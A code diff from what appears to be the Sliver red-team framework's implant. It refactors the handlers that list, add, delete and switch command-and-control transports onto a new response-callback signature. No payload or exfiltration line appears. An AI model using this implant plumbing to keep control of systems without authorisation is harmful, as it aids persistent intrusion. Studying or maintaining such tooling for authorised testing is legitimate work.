@@ -29,6 +29,7 @@ import (
 	"github.com/golang/protobuf/proto"
 
 	"github.com/bishopfox/sliver/implant/sliver/comm"
+	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/commpb"
@@ -38,24 +39,32 @@ import (
 // CommHandler - Handler for managing the Comm subsystem
 type CommHandler func(*sliverpb.Envelope, *transports.Connection)
 
-// commHandlers - All actions pertaining to the Comm subsystem
-var commHandlers map[uint32]CommHandler
+// TransportHandler - Handler for managing the implant transports
+type TransportHandler func(*sliverpb.Envelope, handlers.RPCResponse)
+
+var (
+	commHandlers      map[uint32]CommHandler      // commHandlers - All actions on the Comm system
+	transportHandlers map[uint32]TransportHandler // transportHandlers - All actions on transports
+)
 
 // Has avoided a weird initialization loop error in transportSwitchHandler,
 // which leads us to the map of C2s, and God knows where after that...
 func init() {
 	// commHandlers - All actions pertaining to the Comm subsystem
 	commHandlers = map[uint32]CommHandler{
-		sliverpb.MsgTransportsReq:      c2Handler,
-		sliverpb.MsgAddTransportReq:    addTransportHandler,
-		sliverpb.MsgDeleteTransportReq: deleteTransportHandler,
-		sliverpb.MsgSwitchTransportReq: transportSwitchHandler,
-
 		sliverpb.MsgCommTunnelOpenReq: commTunnelHandler,
 		sliverpb.MsgCommTunnelData:    commTunnelDataHandler,
 
 		sliverpb.MsgHandlerStartReq: startHandler,
 		sliverpb.MsgHandlerCloseReq: closeHandler,
+	}
+
+	// commHandlers - All actions pertaining to the Comm subsystem
+	transportHandlers = map[uint32]TransportHandler{
+		sliverpb.MsgTransportsReq:      c2Handler,
+		sliverpb.MsgAddTransportReq:    addTransportHandler,
+		sliverpb.MsgDeleteTransportReq: deleteTransportHandler,
+		sliverpb.MsgSwitchTransportReq: transportSwitchHandler,
 	}
 }
 
@@ -66,24 +75,27 @@ func GetCommHandlers() map[uint32]CommHandler {
 
 // Transports -------------------------------------------------------------------------------------------
 
-func c2Handler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+func c2Handler(envelope *sliverpb.Envelope, resp handlers.RPCResponse) {
 	req := &sliverpb.TransportsReq{}
 	proto.Unmarshal(envelope.Data, req)
 	res := &sliverpb.Transports{Response: &commonpb.Response{}}
 
 	for _, tp := range Transports.Available {
-		res.Available = append(res.Available, tp.Profile)
+		transport := &sliverpb.Transport{
+			ID:       tp.Profile.ID,
+			Running:  tp.Profile.Active,
+			Attempts: int32(tp.attempts),
+			Profile:  tp.Profile,
+		}
+		res.Transports = append(res.Transports, transport)
 	}
 
 	// Response
-	data, _ := proto.Marshal(res)
-	connection.RequestSend(&sliverpb.Envelope{
-		ID:   envelope.GetID(),
-		Data: data,
-	})
+	data, err := proto.Marshal(res)
+	resp(data, err)
 }
 
-func addTransportHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+func addTransportHandler(envelope *sliverpb.Envelope, resp handlers.RPCResponse) {
 	req := &sliverpb.TransportAddReq{}
 	proto.Unmarshal(envelope.Data, req)
 	res := &sliverpb.TransportAdd{Response: &commonpb.Response{}}
@@ -93,11 +105,8 @@ func addTransportHandler(envelope *sliverpb.Envelope, connection *transports.Con
 	if err != nil {
 		res.Success = false
 		res.Response.Err = err.Error()
-		data, _ := proto.Marshal(res)
-		connection.RequestSend(&sliverpb.Envelope{
-			ID:   envelope.GetID(),
-			Data: data,
-		})
+		data, err := proto.Marshal(res)
+		resp(data, err)
 		return
 	}
 	c2.Priority = int(req.Priority)
@@ -107,17 +116,11 @@ func addTransportHandler(envelope *sliverpb.Envelope, connection *transports.Con
 	res.Success = true
 
 	// Response
-	data, _ := proto.Marshal(res)
-	connection.RequestSend(&sliverpb.Envelope{
-		ID:   envelope.GetID(),
-		Data: data,
-	})
+	data, err := proto.Marshal(res)
+	resp(data, err)
 
 	// Switch with the new, if asked to
 	if req.Switch {
-		// Wait a little to be sure the response has been sent.
-		time.Sleep(500 * time.Millisecond)
-
 		err = Transports.Switch(c2.ID)
 		if err != nil {
 			// {{if .Config.Debug}}
@@ -125,10 +128,9 @@ func addTransportHandler(envelope *sliverpb.Envelope, connection *transports.Con
 			// {{end}}
 		}
 	}
-
 }
 
-func deleteTransportHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+func deleteTransportHandler(envelope *sliverpb.Envelope, resp handlers.RPCResponse) {
 	req := &sliverpb.TransportDeleteReq{}
 	proto.Unmarshal(envelope.Data, req)
 	res := &sliverpb.TransportDelete{Response: &commonpb.Response{}}
@@ -137,40 +139,32 @@ func deleteTransportHandler(envelope *sliverpb.Envelope, connection *transports.
 	res.Success = true
 
 	// Response
-	data, _ := proto.Marshal(res)
-	connection.RequestSend(&sliverpb.Envelope{
-		ID:   envelope.GetID(),
-		Data: data,
-	})
+	data, err := proto.Marshal(res)
+	resp(data, err)
 }
 
-func transportSwitchHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+func transportSwitchHandler(envelope *sliverpb.Envelope, resp handlers.RPCResponse) {
 	req := &sliverpb.TransportSwitchReq{}
 	proto.Unmarshal(envelope.Data, req)
 	res := &sliverpb.TransportSwitch{Response: &commonpb.Response{}}
 
 	tp := Transports.Get(req.ID)
 	if tp == nil {
-		data, _ := proto.Marshal(res)
-		connection.RequestSend(&sliverpb.Envelope{
-			ID:   envelope.GetID(),
-			Data: data,
-		})
+		res.Response.Err = "transport not found"
+		data, err := proto.Marshal(res)
+		resp(data, err)
 		return
 	}
 
 	// Send the response before doing the switch
 	res.Success = true
-	data, _ := proto.Marshal(res)
-	connection.RequestSend(&sliverpb.Envelope{
-		ID:   envelope.GetID(),
-		Data: data,
-	})
+	data, err := proto.Marshal(res)
+	resp(data, err)
 
 	// Wait a little to be sure the response has been sent.
-	time.Sleep(500 * time.Millisecond)
+	// time.Sleep(500 * time.Millisecond)
 
-	err := Transports.Switch(tp.ID)
+	err = Transports.Switch(tp.ID)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Transport switch error: %s", err.Error())
